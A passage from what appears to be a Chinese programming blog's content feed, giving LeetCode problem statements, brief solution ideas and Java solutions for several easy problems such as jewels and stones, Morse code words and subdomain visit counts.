<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">selfDividingNumbers</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> IntStream.range(left, right + <span class="number">1</span>).filter(n -&gt; isSelfDividing(n)).boxed().collect(Collectors.toList());</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isSelfDividing</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> (num + <span class="string">""</span>).chars().allMatch(c -&gt; (c != <span class="string">'0'</span> &amp;&amp; (num % Character.getNumericValue(c)) == <span class="number">0</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>771. 宝石与石头</title>
    <url>/2018/08/29/LeetCode/leetcode-000771.%20%E5%AE%9D%E7%9F%B3%E4%B8%8E%E7%9F%B3%E5%A4%B4/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定字符串<code>J</code>代表石头中宝石的类型，和字符串<code>S</code>代表你拥有的石头。 <code>S</code> 中每个字符代表了一种你拥有的石头的类型，你想知道你拥有的石头中有多少是宝石。</p>
<p><code>J</code> 中的字母不重复，<code>J</code> 和 <code>S</code>中的所有字符都是字母。字母区分大小写，因此”a”和”A”是不同类型的石头。</p>
<p><strong>示例 1:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: J &#x3D; &quot;aA&quot;, S &#x3D; &quot;aAAbbbb&quot;</span><br><span class="line">输出: 3</span><br></pre></td></tr></table></figure>
<p><strong>示例 2:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: J &#x3D; &quot;z&quot;, S &#x3D; &quot;ZZ&quot;</span><br><span class="line">输出: 0</span><br></pre></td></tr></table></figure>
<p><strong>注意:</strong></p>
<ul>
<li>S 和 J 最多含有50个字母。</li>
<li>J 中的字符不重复。</li>
</ul>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>直接计算即可。</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numJewelsInStones</span><span class="params">(String J, String S)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; S.length();i++) &#123;</span><br><span class="line">        	<span class="keyword">char</span> c = S.charAt(i);</span><br><span class="line">        	<span class="keyword">if</span> (-<span class="number">1</span> != J.indexOf(c)) &#123;</span><br><span class="line">        		sum++;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>788. 旋转数字</title>
    <url>/2018/08/29/LeetCode/leetcode-000788.%20%E6%97%8B%E8%BD%AC%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<h2 id="旋转数字"><a href="#旋转数字" class="headerlink" title="旋转数字"></a>旋转数字</h2><p>我们称一个数 X 为好数, 如果它的每位数字逐个地被旋转 180 度后，我们仍可以得到一个有效的，且和 X 不同的数。要求每位数字都要被旋转。</p>
<p>如果一个数的每位数字被旋转以后仍然还是一个数字， 则这个数是有效的。0, 1, 和 8 被旋转后仍然是它们自己；2 和 5 可以互相旋转成对方；6 和 9 同理，除了这些以外其他的数字旋转以后都不再是有效的数字。</p>
<p>现在我们有一个正整数 <code>N</code>, 计算从 <code>1</code> 到 <code>N</code> 中有多少个数 X 是好数？<br><strong>示例：</strong><br>输入: 10<br>输出: 4<br>解释:<br>在[1, 10]中有四个好数： 2, 5, 6, 9。<br>注意 1 和 10 不是好数, 因为他们在旋转之后不变。<br><strong>注意：</strong></p>
<ul>
<li>N 的取值范围是 [1, 10000]。<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3>根据题目所术，如果一个数字中包含3或4或7，那么它就不是一个好数，如果它仅仅包含0或1或8也不是一个好数，那就是说，如果该数字不包含3或4或7，并且包含2或5或6或9任意中的一个的话，那么它就是一个好数。<br>N从1开始迭代，到N，将数字转换为字符串，然后判断是否满足条件即可。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">rotatedDigits</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= N; i++) &#123;</span><br><span class="line">			String num = String.valueOf(i);</span><br><span class="line">			<span class="keyword">if</span> ((num.contains(<span class="string">"2"</span>) || num.contains(<span class="string">"5"</span>) || num.contains(<span class="string">"6"</span>) || num.contains(<span class="string">"9"</span>))</span><br><span class="line">					&amp;&amp; (!num.contains(<span class="string">"3"</span>) &amp;&amp; !num.contains(<span class="string">"4"</span>) &amp;&amp; !num.contains(<span class="string">"7"</span>))) &#123;</span><br><span class="line">				sum++;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sum;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>804. 唯一摩尔斯密码词</title>
    <url>/2018/08/29/LeetCode/leetcode-000804.%20%E5%94%AF%E4%B8%80%E6%91%A9%E5%B0%94%E6%96%AF%E5%AF%86%E7%A0%81%E8%AF%8D/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>国际摩尔斯密码定义一种标准编码方式，将每个字母对应于一个由一系列点和短线组成的字符串， 比如: “a” 对应 “.-“, “b” 对应 <code>&quot;-...&quot;</code>, <code>&quot;c&quot;</code> 对应 <code>&quot;-.-.&quot;</code>, 等等。</p>
<p>为了方便，所有26个英文字母对应摩尔斯密码表如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&quot;.-&quot;,&quot;-...&quot;,&quot;-.-.&quot;,&quot;-..&quot;,&quot;.&quot;,&quot;..-.&quot;,&quot;--.&quot;,&quot;....&quot;,&quot;..&quot;,&quot;.---&quot;,&quot;-.-&quot;,&quot;.-..&quot;,&quot;--&quot;,&quot;-.&quot;,&quot;---&quot;,&quot;.--.&quot;,&quot;--.-&quot;,&quot;.-.&quot;,&quot;...&quot;,&quot;-&quot;,&quot;..-&quot;,&quot;...-&quot;,&quot;.--&quot;,&quot;-..-&quot;,&quot;-.--&quot;,&quot;--..&quot;]</span><br></pre></td></tr></table></figure>
<p>给定一个单词列表，每个单词可以写成每个字母对应摩尔斯密码的组合。例如，”cab” 可以写成 “-.-.-….-“，(即 “-.-.” + “-…” + “.-“字符串的结合)。我们将这样一个连接过程称作单词翻译。<br>返回我们可以获得所有词不同单词翻译的数量。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如:</span><br><span class="line">输入: words &#x3D; [&quot;gin&quot;, &quot;zen&quot;, &quot;gig&quot;, &quot;msg&quot;]</span><br><span class="line">输出: 2</span><br><span class="line">解释: </span><br><span class="line">各单词翻译如下:</span><br><span class="line">&quot;gin&quot; -&gt; &quot;--...-.&quot;</span><br><span class="line">&quot;zen&quot; -&gt; &quot;--...-.&quot;</span><br><span class="line">&quot;gig&quot; -&gt; &quot;--...--.&quot;</span><br><span class="line">&quot;msg&quot; -&gt; &quot;--...--.&quot;</span><br><span class="line"></span><br><span class="line">共有 2 种不同翻译, &quot;--...-.&quot; 和 &quot;--...--.&quot;.</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<ul>
<li>单词列表<code>words</code> 的长度不会超过 <code>100</code>。</li>
<li>每个单词 <code>words[i]</code>的长度范围为 <code>[1, 12]</code>。</li>
<li>每个单词 <code>words[i]</code>只包含小写字母。</li>
</ul>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>转换，去重</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(Map&lt;Character, String&gt; map)</span> </span>&#123;</span><br><span class="line">		String[] mos = <span class="keyword">new</span> String[] &#123;<span class="string">".-"</span>,<span class="string">"-..."</span>,<span class="string">"-.-."</span>,<span class="string">"-.."</span>,<span class="string">"."</span>,<span class="string">"..-."</span>,<span class="string">"--."</span>,<span class="string">"...."</span>,<span class="string">".."</span>,<span class="string">".---"</span>,<span class="string">"-.-"</span>,<span class="string">".-.."</span>,<span class="string">"--"</span>,<span class="string">"-."</span>,<span class="string">"---"</span>,<span class="string">".--."</span>,<span class="string">"--.-"</span>,<span class="string">".-."</span>,<span class="string">"..."</span>,<span class="string">"-"</span>,<span class="string">"..-"</span>,<span class="string">"...-"</span>,<span class="string">".--"</span>,<span class="string">"-..-"</span>,<span class="string">"-.--"</span>,<span class="string">"--.."</span>&#125;;</span><br><span class="line">		<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">char</span> c = <span class="string">'a'</span>; c &lt;= <span class="string">'z'</span>;c++) &#123;</span><br><span class="line">			map.put(c, mos[i++]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> String <span class="title">getWordMos</span><span class="params">(Map&lt;Character, String&gt; map, String word)</span> </span>&#123;</span><br><span class="line">		StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; word.length();i++) &#123;</span><br><span class="line">			sb.append(map.get(word.charAt(i)));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sb.toString();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">uniqueMorseRepresentations</span><span class="params">(String[] words)</span> </span>&#123;</span><br><span class="line">		Map&lt;Character, String&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">		init(map);</span><br><span class="line">		HashSet&lt;String&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">		<span class="keyword">for</span>(String s : words) &#123;</span><br><span class="line">			set.add(getWordMos(map, s));</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="keyword">return</span> set.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>821. 字符的最短距离</title>
    <url>/2018/08/29/LeetCode/leetcode-000821.%20%E5%AD%97%E7%AC%A6%E7%9A%84%E6%9C%80%E7%9F%AD%E8%B7%9D%E7%A6%BB/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个字符串 <code>S</code> 和一个字符 <code>C</code>。返回一个代表字符串 <code>S</code> 中每个字符到字符串 <code>S</code> 中的字符 <code>C</code> 的最短距离的数组.<br><strong>示例 1:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: S &#x3D; &quot;loveleetcode&quot;, C &#x3D; &#39;e&#39;</span><br><span class="line">输出: [3, 2, 1, 0, 1, 0, 0, 1, 2, 2, 1, 0]</span><br></pre></td></tr></table></figure>
<p><strong>说明：</strong></p>
<ul>
<li>字符串 <code>S</code> 的长度范围为 <code>[1, 10000]</code>。</li>
<li><code>C</code> 是一个单字符，且保证是字符串 <code>S</code> 里的字符。</li>
<li><code>S</code> 和 <code>C</code> 中的所有字母均为小写字母。</li>
</ul>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>求出所有字符C在S中的索引，然后找到最小的值即可。</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] shortestToChar(String S, <span class="keyword">char</span> C) &#123;</span><br><span class="line">		<span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[S.length()];</span><br><span class="line">		List&lt;Integer&gt; indexs = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; S.length();i++) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (C == S.charAt(i)) &#123;</span><br><span class="line">        		indexs.add(i);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; S.length();i++) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (C == S.charAt(i)) &#123;</span><br><span class="line">        		result[i] = <span class="number">0</span>;</span><br><span class="line">        	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		result[i] = getMin(i, indexs);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">getMin</span><span class="params">(<span class="keyword">int</span> index, List&lt;Integer&gt; indexs)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> min = Integer.MAX_VALUE;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i : indexs) &#123;</span><br><span class="line">			<span class="keyword">int</span> value = Math.abs(i - index);</span><br><span class="line">			<span class="keyword">if</span> (min &gt; value) &#123;</span><br><span class="line">				min = value;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> min;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>811. 子域名访问计数</title>
    <url>/2018/08/29/LeetCode/leetcode-000811.%20%E5%AD%90%E5%9F%9F%E5%90%8D%E8%AE%BF%E9%97%AE%E8%AE%A1%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>一个网站域名，如”discuss.leetcode.com”，包含了多个子域名。作为顶级域名，常用的有”com”，下一级则有”leetcode.com”，最低的一级为”discuss.leetcode.com”。当我们访问域名”discuss.leetcode.com”时，也同时访问了其父域名”leetcode.com”以及顶级域名 “com”。</p>
<p>给定一个带访问次数和域名的组合，要求分别计算每个域名被访问的次数。其格式为访问次数+空格+地址，例如：”9001 discuss.leetcode.com”。</p>
<p>接下来会给出一组访问次数和域名组合的列表<code>cpdomains</code> 。要求解析出所有域名的访问次数，输出格式和输入格式相同，不限定先后顺序。<br><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: </span><br><span class="line">[&quot;9001 discuss.leetcode.com&quot;]</span><br><span class="line">输出: </span><br><span class="line">[&quot;9001 discuss.leetcode.com&quot;, &quot;9001 leetcode.com&quot;, &quot;9001 com&quot;]</span><br><span class="line">说明: </span><br><span class="line">例子中仅包含一个网站域名：&quot;discuss.leetcode.com&quot;。按照前文假设，子域名&quot;leetcode.com&quot;和&quot;com&quot;都会被访问，所以它们都被访问了9001次。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: </span><br><span class="line">[&quot;900 google.mail.com&quot;, &quot;50 yahoo.com&quot;, &quot;1 intel.mail.com&quot;, &quot;5 wiki.org&quot;]</span><br><span class="line">输出: </span><br><span class="line">[&quot;901 mail.com&quot;,&quot;50 yahoo.com&quot;,&quot;900 google.mail.com&quot;,&quot;5 wiki.org&quot;,&quot;5 org&quot;,&quot;1 intel.mail.com&quot;,&quot;951 com&quot;]</span><br><span class="line">说明: </span><br><span class="line">按照假设，会访问&quot;google.mail.com&quot; 900次，&quot;yahoo.com&quot; 50次，&quot;intel.mail.com&quot; 1次，&quot;wiki.org&quot; 5次。</span><br><span class="line">而对于父域名，会访问&quot;mail.com&quot; 900+1 &#x3D; 901次，&quot;com&quot; 900 + 50 + 1 &#x3D; 951次，和 &quot;org&quot; 5 次。</span><br></pre></td></tr></table></figure>
<p><strong>注意事项：</strong></p>
<ul>
<li><code>cpdomains</code> 的长度小于 <code>100</code>。</li>
<li>每个域名的长度小于<code>100</code>。</li>
<li>每个域名地址包含一个或两个”.”符号。</li>
<li>输入中任意一个域名的访问次数都小于<code>10000</code>。</li>
</ul>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>无，直接计算</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">subdomainVisits</span><span class="params">(String[] cpdomains)</span> </span>&#123;</span><br><span class="line">		Map&lt;String, Integer&gt; domainAndTime = <span class="keyword">new</span> HashMap&lt;&gt;(); </span><br><span class="line">        <span class="keyword">for</span> (String s : cpdomains) &#123;</span><br><span class="line">        	dealWithIt(s, domainAndTime);</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;String&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;(domainAndTime.size());</span><br><span class="line">        <span class="keyword">for</span> (String key : domainAndTime.keySet()) &#123;</span><br><span class="line">        	result.add(domainAndTime.get(key) + <span class="string">" "</span> + key);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">dealWithIt</span><span class="params">(String s, Map&lt;String, Integer&gt; domainAndTime)</span> </span>&#123;</span><br><span class="line">		String[] ss = s.split(<span class="string">" "</span>);</span><br><span class="line">		<span class="keyword">int</span> time = Integer.valueOf(ss[<span class="number">0</span>]);</span><br><span class="line">		String domain = ss[<span class="number">1</span>];</span><br><span class="line">		<span class="keyword">if</span> (domainAndTime.containsKey(domain)) &#123;</span><br><span class="line">			domainAndTime.put(domain, domainAndTime.get(domain) + time);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			domainAndTime.put(domain, time);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> index = domain.indexOf(<span class="string">"."</span>);</span><br><span class="line">		<span class="keyword">while</span> (-<span class="number">1</span> != index) &#123;</span><br><span class="line">			domain = domain.substring(index + <span class="number">1</span>, domain.length());</span><br><span class="line">			<span class="keyword">if</span> (domainAndTime.containsKey(domain)) &#123;</span><br><span class="line">				domainAndTime.put(domain, domainAndTime.get(domain) + time);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				domainAndTime.put(domain, time);</span><br><span class="line">			&#125;</span><br><span class="line">			index = domain.indexOf(<span class="string">"."</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>832. 翻转图像</title>
    <url>/2018/08/29/LeetCode/leetcode-000832.%20%E7%BF%BB%E8%BD%AC%E5%9B%BE%E5%83%8F/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个二进制矩阵 <code>A</code>，我们想先水平翻转图像，然后反转图像并返回结果。</p>
<p>水平翻转图片就是将图片的每一行都进行翻转，即逆序。例如，水平翻转 <code>[1, 1, 0]</code> 的结果是 <code>[0, 1, 1]</code>。</p>
<p>反转图片的意思是图片中的 <code>0</code> 全部被 <code>1</code> 替换， <code>1</code> 全部被 <code>0</code> 替换。例如，反转 <code>[0, 1, 1]</code> 的结果是 <code>[1, 0, 0]</code>。</p>
<h3 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [[1,1,0],[1,0,1],[0,0,0]]</span><br><span class="line">输出: [[1,0,0],[0,1,0],[1,1,1]]</span><br><span class="line">解释: 首先翻转每一行: [[0,1,1],[1,0,1],[0,0,0]]；</span><br><span class="line">     然后反转图片: [[1,0,0],[0,1,0],[1,1,1]]</span><br></pre></td></tr></table></figure>
<h3 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [[1,1,0,0],[1,0,0,1],[0,1,1,1],[1,0,1,0]]</span><br><span class="line">输出: [[1,1,0,0],[0,1,1,0],[0,0,0,1],[1,0,1,0]]</span><br><span class="line">解释: 首先翻转每一行: [[0,0,1,1],[1,0,0,1],[1,1,1,0],[0,1,0,1]]；</span><br><span class="line">     然后反转图片: [[1,1,0,0],[0,1,1,0],[0,0,0,1],[1,0,1,0]]</span><br></pre></td></tr></table></figure>
<h3 id="说明"><a href="#说明" class="headerlink" title="说明:"></a>说明:</h3><ul>
<li><code>1 &lt;= A.length = A[0].length &lt;= 20</code></li>
<li><code>0 &lt;= A[i][j] &lt;= 1</code><h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3>先水平翻转，再翻转位数</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] flipAndInvertImage(<span class="keyword">int</span>[][] A) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; A.length;i++) &#123;</span><br><span class="line">			reverseArray(A[i]);</span><br><span class="line">			flipArray(A[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> A;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reverseArray</span><span class="params">(<span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> begin = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> end = array.length - <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">while</span> (begin &lt;= end) &#123;</span><br><span class="line">			<span class="keyword">int</span> temp = array[begin];</span><br><span class="line">			array[begin] = array[end];</span><br><span class="line">			array[end] = temp;</span><br><span class="line">			begin++;</span><br><span class="line">			end--;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">flipArray</span><span class="params">(<span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; array.length;i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="number">1</span> == array[i] ) &#123;</span><br><span class="line">				array[i] = <span class="number">0</span>;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				array[i] = <span class="number">1</span>;</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>矩阵</tag>
      </tags>
  </entry>
  <entry>
    <title>852. 山脉数组的峰顶索引</title>
    <url>/2018/08/29/LeetCode/leetcode-000852.%20%E5%B1%B1%E8%84%89%E6%95%B0%E7%BB%84%E7%9A%84%E5%B3%B0%E9%A1%B6%E7%B4%A2%E5%BC%95/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>我们把符合下列属性的数组 <code>A</code> 称作山脉：</p>
<ul>
<li><p><code>A.length &gt;= 3</code></p>
</li>
<li><p>存在 <code>0 &lt; i &lt; A.length - 1</code> 使得<code>A[0] &lt; A[1] &lt; ... A[i-1] &lt; A[i] &gt; A[i+1] &gt; ... &gt; A[A.length - 1]</code><br>给定一个确定为山脉的数组，返回任何满足 <code>A[0] &lt; A[1] &lt; ... A[i-1] &lt; A[i] &gt; A[i+1] &gt; ... &gt; A[A.length - 1]</code> 的 <code>i</code> 的值</p>
</li>
</ul>
<h3 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[0,1,0]</span><br><span class="line">输出：1</span><br></pre></td></tr></table></figure>
<h3 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[0,2,1,0]</span><br><span class="line">输出：1</span><br></pre></td></tr></table></figure>
<h3 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h3><ol>
<li><code>3 &lt;= A.length &lt;= 10000</code></li>
<li>0 &lt;= A[i] &lt;= 10^6</li>
<li>A 是如上定义的山脉<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3>遍历，找到index，是的a[index - 1] &lt; a[index] 并且 a[index] &gt; a[index + 1]<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">peakIndexInMountainArray</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> end = A.length - <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span> (index &lt;= end) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (A[index] &lt; A[index + <span class="number">1</span>]) &#123;</span><br><span class="line">        		index++;</span><br><span class="line">        	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (A[index] &gt; A[index + <span class="number">1</span>]) &#123;</span><br><span class="line">        		result = index;</span><br><span class="line">        		<span class="keyword">break</span>;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

